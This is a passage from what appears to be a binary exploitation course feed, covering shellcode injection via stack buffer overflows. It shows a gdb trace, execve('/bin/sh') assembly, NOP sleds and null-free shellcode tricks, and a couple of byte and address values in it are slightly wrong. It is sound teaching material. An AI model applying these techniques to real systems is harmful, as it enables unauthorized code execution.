RBX: 0x401160 (&amp;lt;__libc_csu_init&amp;gt;: endbr64)
RCX: 0x7ffff7eb6052 (&amp;lt;read+18&amp;gt;: cmp rax,0xfffffffffffff000)
RDX: 0x80
RSI: 0x7fffffffd370 (&amp;#39;A&amp;#39; &amp;lt;repeats 24 times&amp;gt;, &amp;#34;`@@&amp;#34;)
RDI: 0x0
RBP: 0x4141414141414141 (&amp;#39;AAAAAAAA&amp;#39;)
RSP: 0x7fffffffd388 --&amp;gt; 0x404060 --&amp;gt; 0xa21646c726fbb48
RIP: 0x40115e (&amp;lt;main+56&amp;gt;: ret)
R8 : 0x0
R9 : 0x7ffff7fdc070 (&amp;lt;_dl_fini&amp;gt;: endbr64)
R10: 0xfffffffffffff4ac
R11: 0x246
R12: 0x401040 (&amp;lt;_start&amp;gt;: endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x401153 &amp;lt;main+45&amp;gt;: call 0x401030 &amp;lt;read@plt&amp;gt;
0x401158 &amp;lt;main+50&amp;gt;: mov eax,0x0
0x40115d &amp;lt;main+55&amp;gt;: leave
=&amp;gt; 0x40115e &amp;lt;main+56&amp;gt;: ret
0x40115f: nop
0x401160 &amp;lt;__libc_csu_init&amp;gt;: endbr64
0x401164 &amp;lt;__libc_csu_init+4&amp;gt;: push r15
0x401166 &amp;lt;__libc_csu_init+6&amp;gt;: lea r15,[rip+0x2c93] # 0x403e00
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd388 --&amp;gt; 0x404060 --&amp;gt; 0xa21646c726fbb48
0008| 0x7fffffffd390 --&amp;gt; 0x7fffffffd40a --&amp;gt; 0xd478000000000000
0016| 0x7fffffffd398 --&amp;gt; 0x1f7fca000
0024| 0x7fffffffd3a0 --&amp;gt; 0x401126 (&amp;lt;main&amp;gt;: push rbp)
0032| 0x7fffffffd3a8 --&amp;gt; 0x7fffffffd859 --&amp;gt; 0x54bcc0a1225a8900
0040| 0x7fffffffd3b0 --&amp;gt; 0x401160 (&amp;lt;__libc_csu_init&amp;gt;: endbr64)
0048| 0x7fffffffd3b8 --&amp;gt; 0x352575cde5bb22d8
0056| 0x7fffffffd3c0 --&amp;gt; 0x401040 (&amp;lt;_start&amp;gt;: endbr64)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x000000000040115e in main () at vuln.c:11
11 }
gdb-peda$ si
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x401160 (&amp;lt;__libc_csu_init&amp;gt;: endbr64)
RCX: 0x7ffff7eb6052 (&amp;lt;read+18&amp;gt;: cmp rax,0xfffffffffffff000)
RDX: 0x80
RSI: 0x7fffffffd370 (&amp;#39;A&amp;#39; &amp;lt;repeats 24 times&amp;gt;, &amp;#34;`@@&amp;#34;)
RDI: 0x0
RBP: 0x4141414141414141 (&amp;#39;AAAAAAAA&amp;#39;)
RSP: 0x7fffffffd390 --&amp;gt; 0x7fffffffd40a --&amp;gt; 0xd478000000000000
RIP: 0x404060 --&amp;gt; 0xa21646c726fbb48
R8 : 0x0
R9 : 0x7ffff7fdc070 (&amp;lt;_dl_fini&amp;gt;: endbr64)
R10: 0xfffffffffffff4ac
R11: 0x246
R12: 0x401040 (&amp;lt;_start&amp;gt;: endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x40405a: add BYTE PTR [rax],al
0x40405c: add BYTE PTR [rax],al
0x40405e: add BYTE PTR [rax],al
=&amp;gt; 0x404060 &amp;lt;machine_code&amp;gt;: movabs rbx,0xa21646c726f
0x40406a &amp;lt;machine_code+10&amp;gt;: push rbx
0x40406b &amp;lt;machine_code+11&amp;gt;: movabs rbx,0x77202c6f6c6c6548
0x404075 &amp;lt;machine_code+21&amp;gt;: push rbx
0x404076 &amp;lt;machine_code+22&amp;gt;: mov rsi,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd390 --&amp;gt; 0x7fffffffd40a --&amp;gt; 0xd478000000000000
0008| 0x7fffffffd398 --&amp;gt; 0x1f7fca000
0016| 0x7fffffffd3a0 --&amp;gt; 0x401126 (&amp;lt;main&amp;gt;: push rbp)
0024| 0x7fffffffd3a8 --&amp;gt; 0x7fffffffd859 --&amp;gt; 0x54bcc0a1225a8900
0032| 0x7fffffffd3b0 --&amp;gt; 0x401160 (&amp;lt;__libc_csu_init&amp;gt;: endbr64)
0040| 0x7fffffffd3b8 --&amp;gt; 0x352575cde5bb22d8
0048| 0x7fffffffd3c0 --&amp;gt; 0x401040 (&amp;lt;_start&amp;gt;: endbr64)
0056| 0x7fffffffd3c8 --&amp;gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000404060 in machine_code ()
gdb-peda$
&lt;/code>&lt;/pre>&lt;/details>
&lt;h1 id="challenges">Challenges&lt;/h1>
&lt;h2 id="06-challenge-binsh-shellcode">06. Challenge: /bin/sh shellcode&lt;/h2>
&lt;p>You are given a piece of assembly code that attempts to spawn a shell with the aid of the &lt;code>execve&lt;/code> syscall. However, the given code is buggy and it will not work. Your task is to figure out what&amp;rsquo;s wrong with it and fix it.&lt;/p>
&lt;h2 id="07-challenge-shellcode-on-stack">07. Challenge: shellcode on stack&lt;/h2>
&lt;p>Up until now we have injected code into some memory area, then used a stack-buffer-overflow vulnerability to overwrite a saved return address and hijack control flow. If we think about it, the legitimately reserved buffer space on the stack &lt;em>is&lt;/em> a memory area and we could perform our attack using a single read: the overflowing one.&lt;/p>
&lt;p>So our payload will consist of the bytes in our shellcode, then some junk to pad the rest of the space to the saved return, then the address of the buffer itself:&lt;/p>
&lt;img src="./assets/shellcode_below.png" width="600">
&lt;p>Now that our shellcode is written on the stack, things become a little harder. Due to several factors (such as the fact that environment variables and command line arguments are placed by the loader on the stack), it is difficult to predict the address at which any value will be placed on the stack. For now, the binary will generously print it for us.&lt;/p>
&lt;p>You can observe the volatility of the stack by changing how you launch the program (rember that the path of the binary is considered a command line argument, namely &lt;code>argv[0]&lt;/code> so it too gets placed on the stack, thus things change depending on what exact relative or absolute path we use):&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ./vuln
0x7fffffffd5d0
$ ../07-challenge-shellcode-on-stack/vuln
0x7fffffffd550
$ ./vuln asdf
0x7fffffffd5c0
$ ./vuln asdfqwer
0x7fffffffd5c0
$ ./vuln asdfqwerasdfqwer
0x7fffffffd5b0
$ ./vuln asdf qwer
0x7fffffffd5b0
$ FOO=bar ./vuln
0x7fffffffd5c0
&lt;/code>&lt;/pre>&lt;h2 id="08-challenge-shellcode-after-saved-ret">08. Challenge: shellcode after saved ret&lt;/h2>
&lt;p>In the previous challenge, we placed our shellcode on the stack, in the space between the overflown buffer&amp;rsquo;s beginning and the saved return address. However, we could switch things up and place the shellcode in the area &lt;em>after&lt;/em> the saved return address. This might be useful when the stack buffer is too short to hold our payload.&lt;/p>
&lt;p>So our payload will consist of padding junk from the beginning of the buffer to the saved return, the address of the next stack portion, then the bytes of our shellcode.&lt;/p>
&lt;img src="./assets/shellcode_above.png" width="600">
&lt;p>To recap: given a stack-buffer-overflow vulnerability we can not only hijack control flow, but also place a shellcode on the stack using the buggy read. There are two regions where we can do this:&lt;/p>
&lt;ul>
&lt;li>between the buffer start and the saved return. The number of bytes we can write here is determined by &lt;em>how much space was allocated on the stack&lt;/em>.&lt;/li>
&lt;li>after the saved return. The number of bytes we can write here is determined by &lt;em>how many bytes are read&lt;/em>.&lt;/li>
&lt;/ul>
&lt;p>If any of these regions is too small, we can try the other one. If both of them are too small, that&amp;rsquo;s a problem. However, note that shellcodes are usually tiny.&lt;/p>
&lt;h2 id="09-challenge-shellcode-after-saved-ret---no-leak">09. Challenge: shellcode after saved ret - no leak&lt;/h2>
&lt;p>This is the same as the previous challenge, only this time the executable does not conveniently leak the buffer&amp;rsquo;s address. So you will have to deal with the differences between running a binary inside and outside of &lt;code>gdb&lt;/code> to precisely determine the necessary address, then jump to it.&lt;/p>
&lt;h2 id="10-challenge-shellcode-as-command-line-arg">10. Challenge: shellcode as command line arg&lt;/h2>
&lt;p>As mentioned in the introduction, reading from stdin or from a file isn&amp;rsquo;t the only way to place content inside the memory space of a process. If we can launch the executable, we can modify its environment or command line arguments. The fact that a program might not use its arguments or environment is irrelevant, the loader can&amp;rsquo;t know this, so it places them in the address space anyway.&lt;/p>
&lt;p>Take the &lt;code>/bin/sh&lt;/code> shellcode and feed it to the program as a command-line argument, then exploit the SBO to actually run it.&lt;/p>
&lt;h2 id="11-challenge-shellcode-in-the-environment">11. Challenge: shellcode in the environment&lt;/h2>
&lt;p>Take the &lt;code>/bin/sh&lt;/code> shellcode and place it in the environment, then exploit the SBO to actually run it.&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;p>&lt;a href="http://phrack.org/issues/49/14.html">&amp;ldquo;Smashing The Stack For Fun And Profit&amp;rdquo;, Aleph One&lt;/a> - a legendary attack paper documenting SBOs and shellcodes. As it is written in &amp;lsquo;96, the examples in it will probably &lt;em>not&lt;/em> work (either out-of-the-box or with some tweaks). We recommend perusing it for its historical/cultural significance, but don&amp;rsquo;t waste much time on the technical details of the examples.&lt;/p>
&lt;h1 id="resources">Resources&lt;/h1>
&lt;p>&lt;a href="http://shell-storm.org/shellcode/">Shell-storm&lt;/a> - a repository of shellcodes.&lt;/p></description></item><item><title>Binary:</title><link>/binary/shellcodes-advanced/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/shellcodes-advanced/</guid><description>
&lt;details open>
&lt;summary>Table of contents&lt;/summary>
&lt;ul>
&lt;li>&lt;a href="#introduction">Introduction&lt;/a>&lt;/li>
&lt;li>&lt;a href="#tutorials">Tutorials&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#01-tutorial-preventing-stack-operations-from-overwriting-the-shellcode">01. Tutorial: preventing stack operations from overwriting the shellcode&lt;/a>&lt;/li>
&lt;li>&lt;a href="#02-tutorial-nop-sleds">02. Tutorial: NOP sleds&lt;/a>&lt;/li>
&lt;li>&lt;a href="#03-tutorial-null-free-shellcodes">03. Tutorial: null-free shellcodes&lt;/a>&lt;/li>
&lt;li>&lt;a href="#04-tutorial-shellcodes-in-pwntools">04. Tutorial: shellcodes in pwntools&lt;/a>&lt;/li>
&lt;li>&lt;a href="#05-tutorial-alphanumeric-shellcode">05. Tutorial: alphanumeric shellcode&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#challenges">Challenges&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#06-challenge-nop-sled-redo">06. Challenge: NOP sled redo&lt;/a>&lt;/li>
&lt;li>&lt;a href="#07-challenge-no-nops-allowed">07. Challenge: No NOPs allowed!&lt;/a>&lt;/li>
&lt;li>&lt;a href="#08-challenge-multiline-output">08. Challenge: multiline output&lt;/a>&lt;/li>
&lt;li>&lt;a href="#09-challenge-execve-blocking-attempt">09: Challenge: execve blocking attempt&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#further-reading">Further Reading&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#input-restrictions">Input restrictions&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/details>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;p>In &lt;a href="../shellcodes">the previous session&lt;/a>, we learned about &lt;strong>shellcodes&lt;/strong>, a form of &lt;strong>code injection&lt;/strong> which allowed us to hijack the control flow of a process and make it do our bidding. The three steps for a succesful shellcode attack are:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>develop&lt;/strong>: obtain the machine code for the desired functionality&lt;/li>
&lt;li>&lt;strong>inject&lt;/strong>: place the shellcode into the process&amp;rsquo; address space&lt;/li>
&lt;li>&lt;strong>trigger&lt;/strong>: divert control flow to the beginning of our shellcode&lt;/li>
&lt;/ul>
&lt;p>The first step seems pretty straightforward, but there are a lot of things that could go wrong with the last two. For example, we cannot inject a shellcode in a process that doesn&amp;rsquo;t read input or reads very little (though remember that if we can launch the target program we can place the shellcode inside its environment or command line arguments); we cannot trigger our shellcode if we cannot overwrite some code-pointer (e.g. a saved return) or if we do not know the precise address at which it ends up in the process&amp;rsquo; memory and we cannot use such an attack if there isn&amp;rsquo;t some memory region where we have both write and execute permissions.&lt;/p>
&lt;p>Some of these hurdles can occur naturally, while others are intentionally created as preventive measures (e.g. on modern platforms, any memory area can be either writable or executable, but not both, a concept known as &lt;a href="https://en.wikipedia.org/wiki/W%5EX">W^X&lt;/a>). Anyway, it is useful to think about these problems and how to work around them, then put that knowledge into practice.&lt;/p>
&lt;h1 id="tutorials">Tutorials&lt;/h1>
&lt;h2 id="01-tutorial-preventing-stack-operations-from-overwriting-the-shellcode">01. Tutorial: preventing stack operations from overwriting the shellcode&lt;/h2>
&lt;p>When performing a shellcode attack we often needed to write some stuff in memory so that it has a valid address. For example, to perform an &lt;code>execve(&amp;quot;/bin/sh&amp;quot;, [&amp;quot;/bin/sh&amp;quot;, NULL], NULL)&lt;/code> syscall, we need to place the string &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> in memory and fill the &lt;code>rdi&lt;/code> register (first argument of a syscall) with that address. In theory we could write it in any writable area but, as you might have noticed in the previous session, it&amp;rsquo;s usually simpler to just use the stack.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">`/&lt;/span>&lt;span style="color:#000">bin&lt;/span>&lt;span style="color:#a40000">/&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#a40000">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">push&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>results in fewer machine-code bytes than:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">`/&lt;/span>&lt;span style="color:#000">bin&lt;/span>&lt;span style="color:#a40000">/&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#a40000">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rbx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x00404000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">qword&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">rbx&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>plus, &lt;code>push&lt;/code>-ing has the side effect of placing our address in the &lt;code>rsp&lt;/code> register which we could later &lt;code>mov&lt;/code> somewhere else, avoiding the need of explicitly referring to some address (which might be difficult to predict, or even random, in the case of ASLR).&lt;/p>
&lt;p>In cases where our shellcode is also injected on the stack this leads to the complicated situation in which the stack serves as both a code and data region. If we aren&amp;rsquo;t careful, our data pushes might end up overwriting the injected code and ruining our attack.&lt;/p>
&lt;p>Run &lt;code>make&lt;/code> then use the &lt;code>exploit.py&lt;/code> script (don&amp;rsquo;t bother with how it works, for now); it will create a shellcode, pad it and feed it to the program, then open a new terminal window with a &lt;code>gdb&lt;/code> instance breaked at the end of the &lt;code>main&lt;/code> function. You can then explore what happens step by step and you will notice that, as the shellcode pushes the data it needs onto the stack it eventually comes to overwrite itself, resulting in some garbage.&lt;/p>
&lt;p>The problem is that, after executing &lt;code>ret&lt;/code> at the end of &lt;code>main&lt;/code> and getting hijacked to jump to the beginning of our shellcode, &lt;code>rip&lt;/code> ends up at &lt;code>0x7ffca44f2280&lt;/code>, while &lt;code>rsp&lt;/code> ends up at &lt;code>0x7ffca44f22c0&lt;/code> (addresses on your machine will probably differ). The instruction pointer is only 64 bytes &lt;strong>below&lt;/strong> the stack pointer.&lt;/p>
&lt;ul>
&lt;li>as instructions get executed, the instruction pointer is &lt;em>incremented&lt;/em>&lt;/li>
&lt;li>as values are pushed onto the stack, the stack pointer is &lt;em>decremented&lt;/em>&lt;/li>
&lt;/ul>
&lt;p>Thus the difference will shrink more and more with each instruction executed. The total length of the shellcode is 48 bytes so that means that after pushing 16 bytes onto the stack (64 - 48) any &lt;code>push&lt;/code> will overwrite the end of our shellcode!&lt;/p>
&lt;p>One obvious solution is to try and modify our shellcode to make it shorter, or to make it push less data onto the stack; this might work in some situations, but it&amp;rsquo;s not a general fix.&lt;/p>
&lt;p>Remember that after the vulnerable function returns, we control the execution of the program; so we can control what happens to the stack! Then we&amp;rsquo;ll simply move the top of the stack to give us some space by adding this as the first instruction to our shellcode:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">sub&lt;/span> &lt;span style="color:#000">rsp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">64&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, right after jumping to our shellcode, &lt;code>rip&lt;/code> and &lt;code>rsp&lt;/code> will be the same, but they&amp;rsquo;ll go on in opposite directions and everything will be well. Uncomment line 64 in &lt;code>exploit.py&lt;/code>, run it again and see what happens.&lt;/p>
&lt;p>If we&amp;rsquo;re at the very low-edge of the stack and can&amp;rsquo;t access memory below, we can use &lt;code>add&lt;/code> to move the stack pointer way up, so that even if the pushed data comes towards our injected code, it will not reach it; after all, our shellcode is short and we&amp;rsquo;re not pushing much.&lt;/p>
&lt;h2 id="02-tutorial-nop-sleds">02. Tutorial: NOP sleds&lt;/h2>
&lt;p>In the previous session, you probably had some difficulties with the &lt;a href="../shellcodes#09-challenge-shellcode-after-saved-ret---no-leak">ninth task&lt;/a>, which asked you to perform a shellcode-on-stack attack without having a leak of the overflown buffer&amp;rsquo;s address. You can determine it using &lt;code>gdb&lt;/code> but, as you&amp;rsquo;ve seen, things differ between &lt;code>gdb&lt;/code> and non-&lt;code>gdb&lt;/code> environments; the problem is even worse if the target binary is running on a remote machine.&lt;/p>
&lt;p>The crux of the issue is the fact that we have to precisely guess &lt;strong>one&lt;/strong> exact address where our shellcode begins. For example, our shellcode might end up looking like this in memory:&lt;/p>
&lt;pre tabindex="0">&lt;code> 0x7fffffffce28: rex.WX adc QWORD PTR [rax+0x0],rax
0x7fffffffce2c: add BYTE PTR [rax],al
0x7fffffffce2e: add BYTE PTR [rax],al
=&amp;gt; 0x7fffffffce30: push 0x68
0x7fffffffce32: movabs rax,0x732f2f2f6e69622f
0x7fffffffce3c: push rax
0x7fffffffce3d: mov rdi,rsp
0x7fffffffce40: push 0x1016972
&lt;/code>&lt;/pre>&lt;p>The first instruction of our shellcode is the &lt;code>push 0x68&lt;/code> at address &lt;code>0x7fffffffce30&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>if we jump before it, we&amp;rsquo;ll execute some garbage interpreted as code; in the above example, missing it by two bytes would execute &lt;code>add BYTE PTR [rax],al&lt;/code> which might SEGFAULT if &lt;code>rax&lt;/code> doesn&amp;rsquo;t happen to hold a valid writable address&lt;/li>
&lt;li>if we jump after it, we&amp;rsquo;ll have a malformed &lt;code>&amp;quot;/bin/sh&amp;quot;&lt;/code> string on the stack, so the later &lt;code>execve&lt;/code> call will not work.&lt;/li>
&lt;/ul>
&lt;p>Fortunately, we don&amp;rsquo;t have to consider the entire address space, so our chances are better than 1 in 2&lt;sup>64&lt;/sup>:&lt;/p>
&lt;ul>
&lt;li>the stack is usually placed at a fixed address (e.g. 0x7fffffffdd000), so we have a known-prefix several octets wide&lt;/li>
&lt;li>due to alignment concerns, the compiler emits code that places buffers and other local data at nice, rounded addresses (ending in &lt;code>0&lt;/code>, or &lt;code>c0&lt;/code>, &lt;code>00&lt;/code> etc.), so we have a known-suffix several bits wide&lt;/li>
&lt;/ul>
&lt;p>On your local machine, using &lt;code>gdb&lt;/code> to look at the buffer&amp;rsquo;s address will then allow you to use just a bit of bruteforce search to determine the address outside of &lt;code>gdb&lt;/code>.&lt;/p>
&lt;p>But what if we could increase our chances to jump to the beginning of our shellcode? So that we don&amp;rsquo;t have to guess &lt;strong>one&lt;/strong> exact address, but just hit some address range? This is where &amp;ldquo;NOP sleds&amp;rdquo; come in.&lt;/p>
&lt;p>A &amp;ldquo;NOP sled&amp;rdquo; is simply a string of &lt;code>NOP&lt;/code> instructions added as a prefix to a shellcode. The salient features of a &lt;code>NOP&lt;/code> instruction that make it useful for us are:&lt;/p>
&lt;ul>
&lt;li>it does nothing&lt;/li>
&lt;li>it&amp;rsquo;s one byte long&lt;/li>
&lt;/ul>
&lt;p>Thus if we chain a bunch of these together and prepend them to our shellcode, we can jump inside the middle of the &amp;ldquo;NOP sled&amp;rdquo; at any position and it will be alright: each subsequent &lt;code>NOP&lt;/code> instruction will be executed, doing nothing, then our shellcode will be reached.&lt;/p>
&lt;p>Our shellcode will end up looking like this in the process memory:&lt;/p>
&lt;pre tabindex="0">&lt;code> 0x7fffffffd427: mov BYTE PTR [rax], al
0x7fffffffd429: nop
0x7fffffffd42a: nop
0x7fffffffd42b: nop
0x7fffffffd42c: nop
0x7fffffffd42d: nop
0x7fffffffd42e: nop
0x7fffffffd42f: nop
=&amp;gt; 0x7fffffffd430: push 0x68
0x7fffffffd432: movabs rax,0x732f2f2f6e69622f
0x7fffffffd43c: push rax
&lt;/code>&lt;/pre>&lt;p>Again, our first &amp;ldquo;useful&amp;rdquo; instruction is the &lt;code>push 0x68&lt;/code> at &lt;code>0x7fffffffd430&lt;/code>. Jumping after it and skipping its execution is still problematic, but notice that we can now jump &lt;strong>before&lt;/strong> it, missing it by several bytes with no issue. If we jump to &lt;code>0x7fffffffd42c&lt;/code> for example, we&amp;rsquo;ll reach a &lt;code>nop&lt;/code>, then execution will pass on to the next &lt;code>nop&lt;/code> and so on; after executing 4 nops, our shellcode will be reached and everything will be as if we had jumped directly to &lt;code>0x7fffffffd430&lt;/code> in the first place. There is now a continuous range of 8 addresses where it&amp;rsquo;s ok to jump to.&lt;/p>
&lt;p>But 8 is such a small number; the longer the NOP sled, the better our chances. The only limit is how much data we can feed into the program when we inject our shellcode.&lt;/p>
&lt;ul>
&lt;li>Run &lt;code>make&lt;/code>, then inspect the &lt;code>vuln&lt;/code> binary in &lt;code>gdb&lt;/code> and determine the location of the vulnerable buffer.&lt;/li>
&lt;li>Modify line 14 of the &lt;code>exploit.py&lt;/code> script with the address you&amp;rsquo;ve found, then run the script. Most likely, it will not work: the address outside of &lt;code>gdb&lt;/code> is different.&lt;/li>
&lt;li>Uncomment line 17 of the script, then run it again.&lt;/li>
&lt;li>You should now have a shell!&lt;/li>
&lt;/ul>
&lt;p>If this doesn&amp;rsquo;t work, play a bit with the address left on line 14; increment it by 256, then decrement it by 256. You&amp;rsquo;re aiming to get &lt;strong>below&lt;/strong> the actual address at some offset smaller than the NOP sled length which, in this example, is 1536.&lt;/p>
&lt;h2 id="03-tutorial-null-free-shellcodes">03. Tutorial: null-free shellcodes&lt;/h2>
&lt;p>Up until now, all the vulnerable programs attacked used &lt;code>read&lt;/code> as a method of getting the input. This allows us to feed them any string of arbitrary bytes. In practice, however, there are many cases in which the input is treated as a 0-terminated &lt;em>string&lt;/em> and processed by functions like &lt;code>strcpy&lt;/code>.&lt;/p>
&lt;p>This means that our shellcode cannot contain a 0 byte because, as far as functions like &lt;code>strcpy&lt;/code> are concerned, that signals the end of the input. However, shellcodes are likely to contain 0 bytes. For example, remember that we need to set &lt;code>rax&lt;/code> to a value indicating the syscall we want; if we wish to &lt;code>execve&lt;/code> a new shell, we&amp;rsquo;ll have to place the value &lt;code>59&lt;/code> in &lt;code>rax&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x3b&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Due to the nature of x86 instructions and the size of the &lt;code>rax&lt;/code> register, that &lt;code>0x3b&lt;/code> might be considered an 8-byte wide constant, yielding the following machine code: &lt;code>48 b8 59 00 00 00 00 00 00 00&lt;/code>.&lt;/p>
&lt;p>As you can see, there are quite a lot of zeroes. We could get rid of them if we considered &lt;code>0x3b&lt;/code> to be a 1-byte wide constant; unfortunately there&amp;rsquo;s no instruction to place into &lt;code>rax&lt;/code> an immediate 1-byte value. However, there is an instruction to place an immediate 1-byte value in &lt;code>al&lt;/code>, the lowest octet of &lt;code>rax&lt;/code>. But we need the other seven octets to be 0&amp;hellip; Fortunately, we can do a trick by xor-ing the register with itself! This will make every bit 0, plus the &lt;code>xor&lt;/code> instruction itself doesn&amp;rsquo;t contain 0 bytes. So we can replace the code above with:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">xor&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">al&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0x3b&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Which assembles to &lt;code>48 31 c0 b0 3b&lt;/code>. Not only are there no 0 bytes, we&amp;rsquo;ve also reduced the size of the code!&lt;/p>
&lt;p>Takeaways:&lt;/p>
&lt;ul>
&lt;li>xor-ing a register with itself is a good way of obtaining some zeroes in memory without using zeroes in machine code&lt;/li>
&lt;li>working with the lower parts of registers avoids immediate values with leading-zeroes&lt;/li>
&lt;/ul>
&lt;p>We can apply these insights in other situations to avoid zeroes in our code. For example, instead of&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">`/&lt;/span>&lt;span style="color:#000">bin&lt;/span>&lt;span style="color:#a40000">/&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#a40000">\&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#a40000">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">push&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can write:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">xor&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">push&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">rax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#a40000">`//&lt;/span>&lt;span style="color:#000">bin&lt;/span>&lt;span style="color:#a40000">/&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#a40000">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">push&lt;/span> &lt;span style="color:#000">rax&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that extra-slashes in a path don&amp;rsquo;t make any difference.&lt;/p>
